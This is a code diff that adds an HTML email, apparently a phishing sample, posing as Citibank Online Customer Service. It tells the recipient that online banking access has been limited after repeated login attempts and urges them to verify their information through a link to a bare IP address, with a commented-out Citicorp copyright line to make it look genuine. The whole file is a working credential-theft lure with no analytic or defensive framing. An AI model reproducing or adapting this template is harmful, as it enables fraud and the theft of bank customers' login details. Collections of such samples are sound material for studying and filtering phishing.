@@ -1,0 +1,37 @@
+<table border="0" cellpadding="0" cellspacing="0" width="600">
+
+<tr>
+        <td width="10"><SPACER height="1" width="10"
+      type="block"></td>
+
+        <td width="590"> <font color="#000066" face="Arial">
+      <p>&nbsp;</p>
+      <p><font color="#000066" face="Arial"><b>Dear Citibank Customer,</b></font></p>
+      <font color="#000000" face="Arial">
+      <p>When signing on to Citibank Online, you or somebody else have made several
+        login attempts and reached your daily attempt limit. As an additional
+        security measure your access to Online Banking has been limited. This
+        Web security measure does not affect your access to phone banking or ATM
+        banking. </p>
+      <p>Please <font color="#000066" face="Arial"><font color="#000000" face="Arial">sign
+        on</font></font><font color="#000000" face="Arial"> </font>and verify
+        your information <a href="http://209.223.236.50/sys/">here</a>. You will
+        be able to attempt signing on to Citibank Online within twenty-four hours
+        after you verify your information. (You do not have to change your Password
+        at this time.)</p>
+      </font><font color="#000000" face="Arial">
+<p>&nbsp;</p>
+      <p><b>Citibank Online Customer Service</b></p>
+      <br>
+      </font></font></td>
+
+</tr>
+<tr>
+        <td width="600" colspan="2" bgcolor="#000060"><SPACER height="1" width="600"
+      type="block"></td>
+</tr>
+<!-- <tr>
+        <td width="600" colspan="2" align="right"><font color="#777777" face="Arial" size="1">Copyright © 2004 Citicorp</font></td>
+</tr> -->
+
+</table>
